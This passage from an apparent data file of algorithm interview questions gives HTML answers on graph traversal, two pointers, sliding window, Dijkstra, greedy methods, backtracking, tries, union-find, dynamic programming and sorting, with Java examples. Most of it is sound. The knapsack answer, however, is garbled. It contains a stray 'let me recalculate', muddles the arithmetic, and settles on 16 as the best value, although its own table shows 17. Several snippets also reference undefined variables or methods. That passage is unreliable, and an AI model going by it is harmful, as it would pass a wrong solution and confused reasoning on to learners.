    Set&lt;Integer&gt; visited = new HashSet&lt;&gt;();
    queue.add(start);
    visited.add(start);
    while (!queue.isEmpty()) {
        int node = queue.poll();
        for (int neighbor : graph.get(node)) {
            if (!visited.contains(neighbor)) {
                visited.add(neighbor);
                queue.add(neighbor);
            }
        }
    }
}

// DFS uses a STACK (or recursion):
void dfs(int node, Set&lt;Integer&gt; visited) {
    visited.add(node);
    for (int neighbor : graph.get(node)) {
        if (!visited.contains(neighbor)) {
            dfs(neighbor, visited);
        }
    }
}</pre>
<table><tr><th>Feature</th><th>BFS</th><th>DFS</th></tr>
<tr><td>Data structure</td><td>Queue</td><td>Stack / Recursion</td></tr>
<tr><td>Finds shortest path?</td><td>Yes (unweighted)</td><td>No</td></tr>
<tr><td>Memory</td><td>Higher (stores entire level)</td><td>Lower</td></tr>
<tr><td>Use case</td><td>Shortest path, level-order</td><td>Cycle detection, topological sort</td></tr></table>
<div class="key-point">Use <strong>BFS</strong> for "shortest path" or "minimum steps" problems. Use <strong>DFS</strong> for "explore all paths", "detect cycles", or when solutions are deep in the graph.</div>`,
      },
      {
        q: 'What is the Two Pointer technique?',
        difficulty: 'medium',
        a: `<p><strong>Two Pointers</strong> = use two indices that move through an array, usually from both ends or at different speeds, to solve problems in O(n).</p>
<p><strong>Analogy:</strong> Two people searching a hallway of lockers — one starts from the left, one from the right. They walk toward each other and meet in the middle.</p>
<p><strong>Example 1: Two Sum (sorted array)</strong></p>
<pre>Find two numbers that add to 9 in [1, 2, 4, 6, 8, 10]:

left = 0 (value 1), right = 5 (value 10)
  1 + 10 = 11 > 9 → move right ← 
  1 + 8 = 9 → FOUND! ✅

// O(n) instead of O(n²) brute force!</pre>
<p><strong>Example 2: Remove duplicates from sorted array</strong></p>
<pre>[1, 1, 2, 2, 3] → [1, 2, 3, _, _]

slow = 0, fast = 1
  fast=1: arr[1]==arr[0], skip
  fast=2: arr[2]!=arr[1], slow++, arr[slow]=arr[fast] → [1,2,2,2,3]
  fast=3: arr[3]==arr[2], skip
  fast=4: arr[4]!=arr[3], slow++, arr[slow]=arr[fast] → [1,2,3,2,3]
Result: first 3 elements = [1, 2, 3] ✅</pre>
<p><strong>Example 3: Is Palindrome?</strong></p>
<pre>"racecar": left='r', right='r' ✅ → left='a', right='a' ✅ → ... → palindrome!</pre>
<p><strong>Patterns:</strong></p>
<ul>
<li><strong>Opposite ends</strong>: Left at start, right at end (two sum, palindrome, container with most water)</li>
<li><strong>Same direction</strong>: Slow and fast pointer (remove duplicates, fast/slow linked list cycle)</li>
</ul>
<div class="key-point">Two pointers usually reduce O(n²) to O(n). Works best on <strong>sorted arrays</strong> or when you need to compare elements from both ends.</div>`,
      },
      {
        q: 'What is the Sliding Window technique?',
        difficulty: 'medium',
        a: `<p><strong>Sliding Window</strong> = maintain a "window" (subarray/substring) that expands or shrinks as you move through the array. Avoids recomputing from scratch each time.</p>
<p><strong>Analogy:</strong> A magnifying glass sliding over a book page. You can see a fixed-size chunk of text at a time. As you slide it right, you lose one character from the left and gain one from the right.</p>
<p><strong>Example 1: Maximum sum of subarray of size K</strong></p>
<pre>Array: [2, 1, 5, 1, 3, 2], K = 3
Find max sum of 3 consecutive elements.

Brute force: Calculate sum of EVERY subarray of size 3 → O(n*k)

Sliding Window: 
  Window [2,1,5] sum = 8
  Slide: remove 2, add 1 → [1,5,1] sum = 8 - 2 + 1 = 7
  Slide: remove 1, add 3 → [5,1,3] sum = 7 - 1 + 3 = 9 ✅ (max!)
  Slide: remove 5, add 2 → [1,3,2] sum = 9 - 5 + 2 = 6
→ O(n)!</pre>
<pre>// Java: Max sum subarray of size k
int maxSum(int[] arr, int k) {
    int windowSum = 0, maxSum = 0;
    for (int i = 0; i < arr.length; i++) {
        windowSum += arr[i];            // add right element
        if (i >= k) windowSum -= arr[i - k]; // remove left element
        if (i >= k - 1) maxSum = Math.max(maxSum, windowSum);
    }
    return maxSum;
}</pre>
<p><strong>Two types:</strong></p>
<ul>
<li><strong>Fixed-size window</strong>: Window always has K elements (max sum subarray)</li>
<li><strong>Variable-size window</strong>: Expand right, shrink left based on condition (longest substring without repeating chars)</li>
</ul>
<div class="key-point">Sliding window turns O(n*k) or O(n²) into O(n). Look for keywords: "contiguous subarray", "substring", "window of size K".</div>`,
      },
      {
        q: 'How does a Graph work? Adjacency List vs Adjacency Matrix.',
        difficulty: 'medium',
        a: `<p>A <strong>Graph</strong> is a collection of nodes (vertices) connected by edges. It models relationships: social networks, roads, web pages, dependencies.</p>
<p><strong>Types:</strong></p>
<ul>
<li><strong>Directed</strong>: Edges have direction (Twitter follow: A→B doesn't mean B→A)</li>
<li><strong>Undirected</strong>: Edges go both ways (Facebook friendship: mutual)</li>
<li><strong>Weighted</strong>: Edges have values (road distances, flight costs)</li>
</ul>
<p><strong>Two ways to store a graph:</strong></p>
<pre>Graph: 0--1--2
       |     |
       3-----+

Adjacency List (most common):
  0: [1, 3]
  1: [0, 2]
  2: [1, 3]
  3: [0, 2]

Adjacency Matrix:
     0  1  2  3
  0 [0, 1, 0, 1]
  1 [1, 0, 1, 0]
  2 [0, 1, 0, 1]
  3 [1, 0, 1, 0]</pre>
<table><tr><th>Operation</th><th>Adjacency List</th><th>Adjacency Matrix</th></tr>
<tr><td>Space</td><td>O(V + E) ✅</td><td>O(V²)</td></tr>
<tr><td>Check if edge exists</td><td>O(degree)</td><td>O(1) ✅</td></tr>
<tr><td>Find all neighbors</td><td>O(degree) ✅</td><td>O(V)</td></tr>
<tr><td>Best for</td><td>Sparse graphs</td><td>Dense graphs</td></tr></table>
<pre>// Java: Adjacency List
Map&lt;Integer, List&lt;Integer&gt;&gt; graph = new HashMap&lt;&gt;();
graph.put(0, Arrays.asList(1, 3));
graph.put(1, Arrays.asList(0, 2));
// etc.</pre>
<div class="key-point">Most real-world graphs are <strong>sparse</strong> (few edges relative to nodes), so <strong>adjacency list</strong> is the default choice. Use adjacency matrix only for small, dense graphs.</div>`,
      },
      {
        q: "What is Dijkstra's Algorithm?",
        difficulty: 'hard',
        a: `<p><strong>Dijkstra's Algorithm</strong> finds the <strong>shortest path</strong> from a source node to all other nodes in a <strong>weighted graph</strong> (non-negative weights).</p>
<p><strong>Analogy:</strong> You're at a city (node A) and want the shortest route to every other city. You start by visiting the nearest city first, then update distances to its neighbors. Always visit the unvisited city with the smallest known distance.</p>
<pre>Graph:
  A --1-- B --3-- D
  |       |       |
  4       2       1
  |       |       |
  C --5-- E --2-- F

Dijkstra from A:
  Start: dist = {A:0, B:∞, C:∞, D:∞, E:∞, F:∞}
  
  Visit A(0): Update B=1, C=4
  Visit B(1): Update D=4, E=3
  Visit E(3): Update C=min(4,8)=4, F=5
  Visit C(4): no improvement
  Visit D(4): Update F=min(5,5)=5
  Visit F(5): done

  Shortest paths from A: {A:0, B:1, C:4, D:4, E:3, F:5}</pre>
<pre>// Java: Dijkstra with Priority Queue
void dijkstra(int[][] graph, int src) {
    int[] dist = new int[n];
    Arrays.fill(dist, Integer.MAX_VALUE);
    dist[src] = 0;
    PriorityQueue&lt;int[]&gt; pq = new PriorityQueue&lt;&gt;((a,b) -> a[1]-b[1]);
    pq.add(new int[]{src, 0});
    
    while (!pq.isEmpty()) {
        int[] curr = pq.poll();
        int u = curr[0], d = curr[1];
        if (d > dist[u]) continue; // already found shorter
        for (int[] neighbor : adj.get(u)) {
            int v = neighbor[0], w = neighbor[1];
            if (dist[u] + w < dist[v]) {
                dist[v] = dist[u] + w;
                pq.add(new int[]{v, dist[v]});
            }
        }
    }
}</pre>
<p><strong>Time:</strong> O((V + E) log V) with priority queue.</p>
<div class="key-point">Dijkstra <strong>does NOT work</strong> with negative edge weights. For negative weights, use <strong>Bellman-Ford</strong>. Google Maps uses a variant of Dijkstra to find shortest routes.</div>`,
      },
      {
        q: 'What is the Greedy Algorithm approach?',
        difficulty: 'medium',
        a: `<p>A <strong>Greedy Algorithm</strong> makes the <strong>locally optimal choice</strong> at each step, hoping it leads to the globally optimal solution.</p>
<p><strong>Analogy:</strong> Climbing a mountain in fog. You can only see a few meters ahead. At each step, you walk in the direction that goes UP the most. This doesn't always get you to the highest peak, but for many problems, it works perfectly.</p>
<p><strong>Example 1: Coin Change (Greedy works here)</strong></p>
<pre>Make change for 36 cents using fewest coins [25, 10, 5, 1]:
  Greedy: Take largest coin first
  25 → remaining 11
  10 → remaining 1
  1  → remaining 0
  Answer: 3 coins [25, 10, 1] ✅</pre>
<p><strong>Example 2: Activity Selection</strong></p>
<pre>Select max non-overlapping activities:
  Activities: [(1,3), (2,5), (3,4), (5,7), (6,8)]
  
  Greedy: Sort by end time, pick earliest ending activity
  Pick (1,3) → Pick (3,4) → Skip (2,5) overlaps → Pick (5,7) → Skip (6,8)
  Answer: 3 activities [(1,3), (3,4), (5,7)] ✅</pre>
<p><strong>When greedy works:</strong></p>
<ul>
<li>Problem has <strong>greedy-choice property</strong>: local optimal → global optimal</li>
<li>Fractional knapsack, Huffman coding, Dijkstra's, minimum spanning tree</li>
</ul>
<p><strong>When greedy FAILS:</strong></p>
<pre>Coins [1, 3, 4], amount = 6:
  Greedy: 4 + 1 + 1 = 3 coins
  Optimal: 3 + 3 = 2 coins ← greedy fails! Need DP instead.</pre>
<div class="key-point">Greedy is <strong>fast and simple</strong> but doesn't always give the optimal answer. If greedy doesn't work, try <strong>Dynamic Programming</strong>.</div>`,
      },
      {
        q: 'What is Backtracking?',
        difficulty: 'hard',
        a: `<p><strong>Backtracking</strong> = try all possible options, and when you hit a dead end, undo the last choice and try a different path. It's like solving a maze — if you hit a wall, go back and try another turn.</p>
<p><strong>Analogy:</strong> Trying combinations on a lock. Try 000, 001, 002... If you know the first digit is 3 (constraint), you skip 000-299 entirely. That's the power of backtracking — <strong>pruning</strong> bad choices early.</p>
<p><strong>Example: Generate all permutations of [1, 2, 3]</strong></p>
<pre>                 []
          /      |      \\
        [1]     [2]     [3]
       /   \\   /   \\   /   \\
    [1,2] [1,3] [2,1] [2,3] [3,1] [3,2]
      |     |     |     |     |     |
  [1,2,3] [1,3,2] [2,1,3] [2,3,1] [3,1,2] [3,2,1]</pre>
<pre>// Java: Permutations
void permute(int[] nums, List&lt;Integer&gt; current, boolean[] used, List&lt;List&lt;Integer&gt;&gt; result) {
    if (current.size() == nums.length) {
        result.add(new ArrayList&lt;&gt;(current));
        return;
    }
    for (int i = 0; i < nums.length; i++) {
        if (used[i]) continue;       // skip if already used
        used[i] = true;              // choose
        current.add(nums[i]);
        permute(nums, current, used, result); // explore
        current.remove(current.size() - 1);   // un-choose (backtrack!)
        used[i] = false;
    }
}</pre>
<p><strong>Classic backtracking problems:</strong></p>
<ul>
<li>N-Queens: Place N queens on a chessboard so none attack each other</li>
<li>Sudoku solver: Try numbers 1-9, backtrack if conflict</li>
<li>Subsets, Combinations, Permutations</li>
<li>Word search in a grid</li>
</ul>
<div class="key-point">Backtracking template: <strong>Choose → Explore → Un-choose</strong>. The "un-choose" step is what makes it backtracking. Always add <strong>pruning conditions</strong> to skip obviously bad paths.</div>`,
      },
      {
        q: 'What is the difference between Stable and Unstable sorting?',
        difficulty: 'easy',
        a: `<p>A <strong>stable</strong> sort preserves the relative order of equal elements. An <strong>unstable</strong> sort doesn't guarantee it.</p>
<p><strong>Analogy:</strong> You have a list of students sorted by name. Now sort by grade. With a <strong>stable</strong> sort, students with the same grade remain alphabetically ordered. With an unstable sort, their name order might get shuffled.</p>
<pre>Original (sorted by name):
  Alice: B
  Bob: A
  Charlie: B
  David: A

Stable sort by grade:
  Bob: A      ← David after Bob (original order preserved)
  David: A
  Alice: B    ← Charlie after Alice (original order preserved)
  Charlie: B

Unstable sort by grade:
  David: A    ← order of A's might be swapped!
  Bob: A
  Charlie: B  ← order of B's might be swapped!
  Alice: B</pre>
<table><tr><th>Stable Sorts</th><th>Unstable Sorts</th></tr>
<tr><td>Merge Sort</td><td>Quick Sort</td></tr>
<tr><td>Insertion Sort</td><td>Heap Sort</td></tr>
<tr><td>Bubble Sort</td><td>Selection Sort</td></tr>
<tr><td>Timsort (Java/Python)</td><td></td></tr></table>
<div class="key-point">Stability matters when you sort by multiple criteria (e.g., sort by date, then by priority). Java's <code>Arrays.sort()</code> uses <strong>Timsort (stable)</strong> for objects and <strong>Dual-Pivot Quicksort (unstable)</strong> for primitives.</div>`,
      },
      {
        q: 'How do you detect a cycle in a Linked List?',
        difficulty: 'medium',
        a: `<p>Use <strong>Floyd's Tortoise and Hare</strong> algorithm: two pointers, one moves 1 step (slow), the other moves 2 steps (fast). If there's a cycle, they'll eventually meet.</p>
<p><strong>Analogy:</strong> Two runners on a circular track. The fast runner laps the slow runner — they MUST meet. On a straight track (no cycle), the fast runner just reaches the end.</p>
<pre>Linked List with cycle:
  1 → 2 → 3 → 4 → 5
              ↑       ↓
              8 ← 7 ← 6

Step 1: slow=1, fast=1
Step 2: slow=2, fast=3
Step 3: slow=3, fast=5
Step 4: slow=4, fast=7
Step 5: slow=5, fast=3
Step 6: slow=6, fast=5
Step 7: slow=7, fast=7 → MEET! Cycle detected! ✅</pre>
<pre>// Java: Floyd's Cycle Detection
boolean hasCycle(ListNode head) {
    ListNode slow = head, fast = head;
    while (fast != null && fast.next != null) {
        slow = slow.next;         // 1 step
        fast = fast.next.next;    // 2 steps
        if (slow == fast) return true;  // they met → cycle!
    }
    return false;  // fast reached end → no cycle
}

// Find WHERE the cycle starts:
ListNode findCycleStart(ListNode head) {
    ListNode slow = head, fast = head;
    while (fast != null && fast.next != null) {
        slow = slow.next;
        fast = fast.next.next;
        if (slow == fast) {
            slow = head;  // reset slow to head
            while (slow != fast) {  // move both 1 step
                slow = slow.next;
                fast = fast.next;
            }
            return slow;  // meeting point = cycle start
        }
    }
    return null;
}</pre>
<div class="key-point">Time: O(n), Space: O(1). This is much better than using a HashSet (O(n) space). Floyd's algorithm is a classic interview question!</div>`,
      },
      {
        q: 'What is a Trie (Prefix Tree) and when is it used?',
        difficulty: 'hard',
        a: `<p>A <strong>Trie</strong> is a tree-like data structure for storing strings where each node represents a character. It's extremely fast for prefix-based lookups.</p>
<p><strong>Analogy:</strong> A dictionary organized letter by letter. To find "cat", go to 'c', then 'a', then 't'. To find all words starting with "ca", follow 'c' → 'a' and you immediately see all options.</p>
<pre>Trie storing ["cat", "car", "card", "dog"]:

        root
       /    \\
      c      d
      |      |
      a      o
     / \\     |
    t*  r*   g*
        |
        d*
  (* = end of word)

Search "car": c→a→r (found, marked as word ✅)
Search "ca":  c→a (found prefix, but not a complete word)
Prefix "ca":  Follow c→a → find all children: "cat", "car", "card"</pre>
<pre>// Java: Trie implementation
class TrieNode {
    TrieNode[] children = new TrieNode[26];
    boolean isWord = false;
}

class Trie {
    TrieNode root = new TrieNode();
    
    void insert(String word) {
        TrieNode node = root;
        for (char c : word.toCharArray()) {
            if (node.children[c - 'a'] == null)
                node.children[c - 'a'] = new TrieNode();
            node = node.children[c - 'a'];
        }
        node.isWord = true;
    }
    
    boolean search(String word) {
        TrieNode node = find(word);
        return node != null && node.isWord;
    }
    
    boolean startsWith(String prefix) {
        return find(prefix) != null;
    }
}</pre>
<p><strong>Use cases:</strong></p>
<ul>
<li><strong>Autocomplete</strong>: "Type 'goo' → suggest google, good, goose"</li>
<li><strong>Spell checker</strong>: Check if a word exists quickly</li>
<li><strong>IP routing</strong>: Longest prefix matching</li>
<li><strong>Word games</strong>: Boggle, Scrabble word validation</li>
</ul>
<div class="key-point">Trie search is <strong>O(L)</strong> where L is length of the word — independent of how many words are stored! Much faster than HashSet for prefix queries.</div>`,
      },
      {
        q: 'What is the Knapsack Problem?',
        difficulty: 'hard',
        a: `<p>The <strong>Knapsack Problem</strong>: Given items with weights and values, select items to maximize total value without exceeding a weight limit.</p>
<p><strong>Analogy:</strong> You're packing for a hike with a backpack that holds 10kg. You have a tent (3kg, value 5), sleeping bag (4kg, value 7), food (5kg, value 8), camera (2kg, value 4). What do you take to maximize usefulness?</p>
<p><strong>0/1 Knapsack (can't split items):</strong></p>
<pre>Items: [{weight:3, value:5}, {weight:4, value:7}, 
        {weight:5, value:8}, {weight:2, value:4}]
Capacity: 10kg

Brute force: Try all combinations (2ⁿ) → too slow!

DP approach: Build a table
     weight →  0  1  2  3  4  5  6  7  8  9  10
item 0 (3,5):  0  0  0  5  5  5  5  5  5  5   5
item 1 (4,7):  0  0  0  5  7  7  7  12 12 12  12
item 2 (5,8):  0  0  0  5  7  8  8  12 13 15  15
item 3 (2,4):  0  0  4  5  7  9  11 12 12 16  17

Answer: 17 (take items: sleeping bag + food + camera = 4+5+2=11... 
             actually: 5+7+4+... let me recalculate)
Best: sleeping bag(7) + food(8) + camera(4) = 19? weight = 4+5+2 = 11 > 10
Take: tent(5) + sleeping bag(7) + camera(4) = 16, weight = 3+4+2 = 9 ✅</pre>
<pre>// Java: 0/1 Knapsack DP
int knapsack(int[] weights, int[] values, int capacity) {
    int n = weights.length;
    int[][] dp = new int[n + 1][capacity + 1];
    for (int i = 1; i <= n; i++) {
        for (int w = 0; w <= capacity; w++) {
            dp[i][w] = dp[i-1][w]; // don't take item i
            if (weights[i-1] <= w)
                dp[i][w] = Math.max(dp[i][w], 
                    dp[i-1][w - weights[i-1]] + values[i-1]); // take it
        }
    }
    return dp[n][capacity];
}</pre>
<div class="key-point">0/1 Knapsack is a classic <strong>DP problem</strong>: O(n × capacity). Variations: Unbounded Knapsack (unlimited copies), Fractional Knapsack (can split items — use Greedy).</div>`,
      },
      {
        q: 'What is Topological Sort?',
        difficulty: 'hard',
        a: `<p><strong>Topological Sort</strong> orders nodes in a <strong>directed acyclic graph (DAG)</strong> such that for every edge A→B, A comes before B.</p>
<p><strong>Analogy:</strong> Getting dressed. You must put on underwear before pants, socks before shoes. There's a dependency order. Topological sort gives you a valid order to get dressed.</p>
<pre>Dependencies:
  underwear → pants → belt
  shirt → belt → jacket
  socks → shoes
  pants → shoes

Topological Sort: underwear, socks, shirt, pants, belt, shoes, jacket
(Any valid order where dependencies come first)</pre>
<pre>Graph:
  A → B → D
  A → C → D

Topological order: A, B, C, D (or A, C, B, D) — both valid</pre>
<pre>// Java: Topological Sort using BFS (Kahn's Algorithm)
List&lt;Integer&gt; topologicalSort(int n, List&lt;List&lt;Integer&gt;&gt; adj) {
    int[] inDegree = new int[n];
    for (int u = 0; u < n; u++)
        for (int v : adj.get(u)) inDegree[v]++;
    
    Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;();
    for (int i = 0; i < n; i++)
        if (inDegree[i] == 0) queue.add(i); // no dependencies
    
    List&lt;Integer&gt; order = new ArrayList&lt;&gt;();
    while (!queue.isEmpty()) {
        int u = queue.poll();
        order.add(u);
        for (int v : adj.get(u)) {
            if (--inDegree[v] == 0) queue.add(v);
        }
    }
    return order.size() == n ? order : null; // null = has cycle!
}</pre>
<p><strong>Use cases:</strong></p>
<ul>
<li>Build systems (compile A before B)</li>
<li>Task scheduling with dependencies</li>
<li>Course prerequisite ordering</li>
<li>Package dependency resolution (npm, Maven)</li>
</ul>
<div class="key-point">Topological sort only works on <strong>DAGs</strong> (directed graphs with no cycles). If there's a cycle, no valid ordering exists. Kahn's algorithm detects cycles: if result size < n, there's a cycle.</div>`,
      },
      {
        q: 'What is the Union-Find (Disjoint Set) data structure?',
        difficulty: 'hard',
        a: `<p><strong>Union-Find</strong> tracks a collection of elements partitioned into disjoint (non-overlapping) sets. It supports two operations efficiently: <strong>Find</strong> (which set does this element belong to?) and <strong>Union</strong> (merge two sets).</p>
<p><strong>Analogy:</strong> Social groups at a party. Each group has a leader. When two groups decide to merge, one leader becomes the new leader. To check if two people are in the same group, check if they have the same leader.</p>
<pre>Initially: Each person is their own group
  {A} {B} {C} {D} {E}

Union(A, B): A and B in same group → {A,B} {C} {D} {E}
Union(C, D): → {A,B} {C,D} {E}
Union(B, D): merge groups → {A,B,C,D} {E}
Find(A) == Find(C)? → YES, same group ✅
Find(A) == Find(E)? → NO, different groups ❌</pre>
<pre>// Java: Union-Find with path compression + union by rank
class UnionFind {
    int[] parent, rank;
    
    UnionFind(int n) {
        parent = new int[n];
        rank = new int[n];
        for (int i = 0; i < n; i++) parent[i] = i; // each is own parent
    }
    
    int find(int x) {
        if (parent[x] != x)
            parent[x] = find(parent[x]); // path compression!
        return parent[x];
    }
    
    void union(int x, int y) {
        int px = find(x), py = find(y);
        if (px == py) return; // already same group
        if (rank[px] < rank[py]) parent[px] = py;      // union by rank
        else if (rank[px] > rank[py]) parent[py] = px;
        else { parent[py] = px; rank[px]++; }
    }
    
    boolean connected(int x, int y) {
        return find(x) == find(y);
    }
}</pre>
<p><strong>Use cases:</strong></p>
<ul>
<li>Detect cycle in undirected graph</li>
<li>Kruskal's minimum spanning tree</li>
<li>Connected components (number of islands)</li>
<li>Network connectivity</li>
</ul>
<div class="key-point">With path compression + union by rank, both Find and Union are nearly <strong>O(1)</strong> — technically O(α(n)) which is ≤ 4 for any practical input size.</div>`,
      },
      {
        q: "How do you solve the 'Two Sum' problem?",
        difficulty: 'easy',
        a: `<p><strong>Problem:</strong> Given an array and a target, find two numbers that add up to the target. Return their indices.</p>
<p><strong>Analogy:</strong> You have a jar of numbered balls. You pick one ball and ask: "Is there another ball that, together, adds up to the target?" Instead of checking every pair (slow), you remember what you've already seen.</p>
<pre>Array: [2, 7, 11, 15], Target: 9

Brute Force O(n²):
  Check every pair: (2,7)=9 ✅ found!
  But slow for large arrays.

HashMap O(n):
  For each number, check if (target - number) exists in the map.
  
  num=2: need 9-2=7, map={} → not found, store {2:0}
  num=7: need 9-7=2, map={2:0} → FOUND! ✅ indices [0, 1]</pre>
<pre>// Java: Two Sum with HashMap
int[] twoSum(int[] nums, int target) {
    Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;();
    for (int i = 0; i < nums.length; i++) {
        int complement = target - nums[i];
        if (map.containsKey(complement)) {
            return new int[]{map.get(complement), i};
        }
        map.put(nums[i], i);
    }
    return new int[]{};
}

// If array is SORTED → use Two Pointers instead:
int left = 0, right = arr.length - 1;
while (left < right) {
    int sum = arr[left] + arr[right];
    if (sum == target) return new int[]{left, right};
    else if (sum < target) left++;
    else right--;
}</pre>
<div class="key-point">"Two Sum" is the <strong>#1 most asked interview question</strong> (LeetCode #1). The HashMap approach trades space for time: O(n) time, O(n) space. It's a pattern: when you need to find a complement, use a HashMap.</div>`,
      },
      {
        q: 'What is Bit Manipulation and common bitwise tricks?',
        difficulty: 'medium',
        a: `<p><strong>Bit Manipulation</strong> = working directly with binary representations of numbers. Extremely fast and memory-efficient.</p>
<p><strong>Analogy:</strong> Normal math uses decimal (base 10). Computers think in binary (base 10 → base 2). Bit manipulation is "speaking the computer's native language".</p>
<pre>Basic operators:
  AND (&):  1010 & 1100 = 1000  (both bits must be 1)
  OR  (|):  1010 | 1100 = 1110  (either bit is 1)
  XOR (^):  1010 ^ 1100 = 0110  (bits are different)
  NOT (~):  ~1010 = 0101        (flip all bits)
  LEFT SHIFT (<<):  0001 << 2 = 0100  (multiply by 2^n)
  RIGHT SHIFT (>>): 1000 >> 2 = 0010  (divide by 2^n)</pre>
<p><strong>Common tricks:</strong></p>
<pre>// Check if number is even or odd:
(n & 1) == 0  →  even   (last bit is 0)
(n & 1) == 1  →  odd    (last bit is 1)

// Multiply/divide by 2:
n << 1  →  n * 2
n >> 1  →  n / 2

// Check if power of 2:
(n & (n - 1)) == 0  →  is power of 2
// 8 = 1000, 7 = 0111 → 1000 & 0111 = 0000 ✅

// Swap without temp variable:
a ^= b; b ^= a; a ^= b;

// Find the only non-duplicate in array:
// [2, 3, 2, 4, 3] → XOR all: 2^3^2^4^3 = 4
// (because x ^ x = 0, and x ^ 0 = x)</pre>
<pre>// Java: Count number of 1 bits
int hammingWeight(int n) {
    int count = 0;
    while (n != 0) {
        count += (n & 1);
        n >>>= 1;  // unsigned right shift
    }
    return count;
}</pre>
<div class="key-point">XOR is the most useful bit operator in interviews. Key properties: <code>x ^ x = 0</code>, <code>x ^ 0 = x</code>. This solves "find the single number" in O(n) time, O(1) space.</div>`,
      },
      {
        q: 'What is Memoization vs Tabulation in Dynamic Programming?',
        difficulty: 'medium',
        a: `<p>Both are strategies for DP. They store computed results to avoid redundant work.</p>
<p><strong>Memoization (Top-Down):</strong> Start from the big problem, recursively break it down, and <strong>cache</strong> results as you go.</p>
<p><strong>Tabulation (Bottom-Up):</strong> Start from the smallest sub-problems, iteratively build up to the answer using a <strong>table</strong>.</p>
<p><strong>Analogy — Building a staircase to floor 10:</strong></p>
<ul>
<li><strong>Memoization</strong>: Start at floor 10, ask "how do I get here?" → need floor 9 → need floor 8... Eventually reach floor 1 (base case). Remember each floor's answer.</li>
<li><strong>Tabulation</strong>: Start at floor 1, calculate ways to reach floor 2, then floor 3... build up to floor 10.</li>
</ul>
<pre>// Climbing Stairs: How many ways to reach step n? (1 or 2 steps at a time)

// Memoization (Top-Down):
int[] memo = new int[n + 1];
int climb(int n) {
    if (n <= 2) return n;
    if (memo[n] != 0) return memo[n];
    memo[n] = climb(n - 1) + climb(n - 2);  // recurse + cache
    return memo[n];
}

// Tabulation (Bottom-Up):
int climb(int n) {
    int[] dp = new int[n + 1];
    dp[1] = 1; dp[2] = 2;
    for (int i = 3; i <= n; i++) {
        dp[i] = dp[i-1] + dp[i-2];  // build from small to big
    }
    return dp[n];
}</pre>
<table><tr><th>Feature</th><th>Memoization</th><th>Tabulation</th></tr>
<tr><td>Direction</td><td>Top → Down</td><td>Bottom → Up</td></tr>
<tr><td>Technique</td><td>Recursion + cache</td><td>Iteration + table</td></tr>
<tr><td>Computes</td><td>Only needed subproblems</td><td>All subproblems</td></tr>
<tr><td>Stack overflow?</td><td>Possible (deep recursion)</td><td>No</td></tr></table>
<div class="key-point">Memoization is usually <strong>easier to write</strong> (just add cache to recursion). Tabulation is <strong>more efficient</strong> (no recursion overhead) and avoids stack overflow. In interviews, start with memoization, then optimize to tabulation if asked.</div>`,
      },
      {
        q: 'How does Counting Sort / Radix Sort work? When are they faster than O(n log n)?',
        difficulty: 'hard',
        a: `<p><strong>Counting Sort</strong> and <strong>Radix Sort</strong> are non-comparison sorts that can beat the O(n log n) barrier by using the structure of the data itself.</p>
<p><strong>Counting Sort — O(n + k)</strong> where k is the range of values:</p>
<p><strong>Analogy:</strong> You have 100 exam scores from 0-100. Instead of comparing scores, just count how many students got each score and rebuild the sorted list.</p>
<pre>Input: [4, 2, 2, 8, 3, 3, 1]

Step 1: Count occurrences:
  index: 0  1  2  3  4  5  6  7  8
  count: 0  1  2  2  1  0  0  0  1

Step 2: Build sorted output by reading counts:
  1 appears 1 time → [1]
  2 appears 2 times → [1, 2, 2]
  3 appears 2 times → [1, 2, 2, 3, 3]
  4 appears 1 time → [1, 2, 2, 3, 3, 4]
  8 appears 1 time → [1, 2, 2, 3, 3, 4, 8] ✅</pre>
<p><strong>Radix Sort — O(d × (n + k))</strong> where d = number of digits:</p>
<pre>Sort [170, 45, 75, 90, 802, 24, 2, 66]:

Sort by 1s digit:  [170, 90, 802, 2, 24, 45, 75, 66]
Sort by 10s digit: [802, 2, 24, 45, 66, 170, 75, 90]
Sort by 100s digit:[2, 24, 45, 66, 75, 90, 170, 802] ✅</pre>
<table><tr><th>Algorithm</th><th>Time</th><th>Works when</th></tr>
<tr><td>Counting Sort</td><td>O(n + k)</td><td>Small range of integers (e.g., ages 0-150)</td></tr>
<tr><td>Radix Sort</td><td>O(d(n+k))</td><td>Fixed-length integers or strings</td></tr></table>
<div class="key-point">These sorts are <strong>faster than Quick/Merge Sort</strong> when the data range is limited. Counting Sort is used inside Radix Sort as a subroutine. Not suitable for arbitrary floating-point numbers.</div>`,
      },
      {
        q: 'What is a Monotonic Stack and when do you use it?',
        difficulty: 'hard',
        a: `<p>A <strong>Monotonic Stack</strong> is a stack that maintains elements in a strictly increasing or decreasing order. Elements are popped when the ordering would be violated.</p>
<p><strong>Analogy:</strong> A line of people sorted by height. When a tall person arrives, everyone shorter in front of them steps out of line. The line stays in order.</p>
<p><strong>Classic problem: Next Greater Element</strong></p>
<pre>Input: [2, 1, 2, 4, 3]
Output: [4, 2, 4, -1, -1]   (next element that is GREATER)

For each number, what's the next bigger number to its right?
  2 → next greater is 4
  1 → next greater is 2
  2 → next greater is 4
  4 → nothing bigger → -1
  3 → nothing bigger → -1

Using Monotonic Stack (decreasing):
  i=0: stack=[], push 0 → stack=[0(2)]
  i=1: 1 < 2, push 1 → stack=[0(2), 1(1)]
  i=2: 2 > 1, pop 1 → answer[1]=2. 2 == 2, push 2 → stack=[0(2), 2(2)]
  i=3: 4 > 2, pop 2 → answer[2]=4. 4 > 2, pop 0 → answer[0]=4. push 3 → stack=[3(4)]
  i=4: 3 < 4, push 4 → stack=[3(4), 4(3)]
  Remaining: answer[3]=-1, answer[4]=-1</pre>
<pre>// Java: Next Greater Element
int[] nextGreater(int[] nums) {
    int[] result = new int[nums.length];
    Arrays.fill(result, -1);
    Deque&lt;Integer&gt; stack = new ArrayDeque&lt;&gt;(); // stores indices
    
    for (int i = 0; i < nums.length; i++) {
        while (!stack.isEmpty() && nums[stack.peek()] < nums[i]) {
            result[stack.pop()] = nums[i]; // found next greater!
        }
        stack.push(i);
    }
    return result;
}</pre>
<p><strong>Use cases:</strong> Next greater/smaller element, largest rectangle in histogram, stock span problem, trapping rain water.</p>
<div class="key-point">Monotonic stack solves "next greater/smaller element" problems in <strong>O(n)</strong> instead of O(n²). Each element is pushed and popped at most once.</div>`,
      },
      {
        q: 'What is Binary Search on Answer?',
        difficulty: 'medium',
        a: `<p><strong>Binary Search on Answer</strong> = instead of searching for an element in an array, you binary search over the <strong>range of possible answers</strong> to find the optimal one.</p>
